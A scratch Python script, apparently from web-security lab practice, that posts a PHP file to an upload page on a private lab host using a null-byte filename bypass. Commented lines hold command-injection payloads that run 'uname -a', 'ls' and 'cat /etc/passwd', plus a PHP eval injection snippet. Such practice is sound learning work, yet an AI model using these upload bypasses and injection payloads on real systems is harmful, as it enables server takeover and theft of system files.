import requests
from urllib import request, parse
# https://null-byte.wonderhowto.com/how-to/bypass-file-upload-restrictions-web-apps-get-shell-0323454/
# import lxml.etree as etree
# import lxml.html




# import requests
# files = {'image': open('test.php', 'rb')}
# r = requests.post("http://10.0.1.14/upload/example1.php", files=files)
# print(r.text)

# https://stackoverflow.com/questions/36484184/python-make-a-post-request-using-python-3-urllib
# from urllib import request, parse
# data = parse.urlencode(<your data dict>).encode()
# req =  request.Request(<your url>, data=data) # this will make the method "POST"
# resp = request.urlopen(req)



# https://stackoverflow.com/questions/32029545/how-send-post-file-image-in-python-3
# The simple way to send a file in python, is to use the requests library:

# import requests
# files = {'file': open('1.jpg', 'rb')}
# r = requests.post(url, files=files)
# print(r.text)

# https://stackoverflow.com/questions/22567306/python-requests-file-upload

with open('test.php', 'rb') as f:
	files = {'image': ('test8.php\x00.jpg', f)}
	# print(files)
	# print(type(files))
	# print(type(files['image']))
	# r = requests.post('http://10.0.1.14/upload/example1.php', image={'test.php': f})
	r = requests.post("http://10.0.1.14/upload/example2.php", files=files)

print(r.text)


# with open('test.php', 'rb') as f:
# 	# data = 
# 	data = parse.urlencode({'image': f}).encode()
# 	req =  request.Request("http://10.0.1.14/upload/example1.php", data=data) # this will make the method "POST"
# 	resp = request.urlopen(req)
# 	print(resp.read())
	# r = requests.post('http://10.0.1.14/upload/example1.php', image={'test.php': f})
	# r = requests.post("http://10.0.1.14/upload/example1.php", files=files)

# print(r.text)

# $str="echo \"Hello ".$_GET['name']."!!!\";";
# eval($str);

# payload = {"ip": "127.0.0.1"}
# payload = {"ip": "127.0.0.1|uname+-a"}

# payload = {"ip": ";ls"}
# payload = {"ip": "10.0.1.14;uname -a"}
# payload = {"ip": "127.0.0.1\ncat /etc/passwd"}

# payload = urllib.parse.urlencode(payload)
# # http://10.0.1.14/commandexec/example3.php?ip=127.0.0.1
# url = "http://10.0.1.14/commandexec/example3.php?"+payload
# print(url)

# with urllib.request.urlopen(url) as reponse:
# 	content = reponse.read()

# tree = lxml.html.fromstring(content)
# node = tree.xpath("//pre")[0]

# result = node.text + ''.join(etree.tostring(e) for e in node)
# print(result)

